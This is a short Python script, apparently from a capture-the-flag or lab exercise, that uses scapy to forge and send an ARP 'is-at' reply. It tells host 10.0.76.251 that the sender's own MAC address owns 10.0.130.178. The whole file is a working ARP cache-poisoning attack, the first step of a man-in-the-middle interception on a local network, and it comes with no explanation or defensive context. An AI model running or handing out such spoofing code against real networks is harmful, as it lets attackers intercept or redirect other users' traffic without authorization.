#!/usr/bin/env python3 

import requests
from pwn import *
# add python script

from scapy.all import *

eth = Ether(src=get_if_hwaddr("eth0"), dst="26:4a:24:8d:36:69")

arp = ARP(
    op="is-at",
    hwsrc=get_if_hwaddr("eth0"),
    psrc="10.0.130.178",
    hwdst="26:4a:24:8d:36:69",
    pdst="10.0.76.251"
)

packet = eth / arp

sendp(packet, iface="eth0", verbose=True)
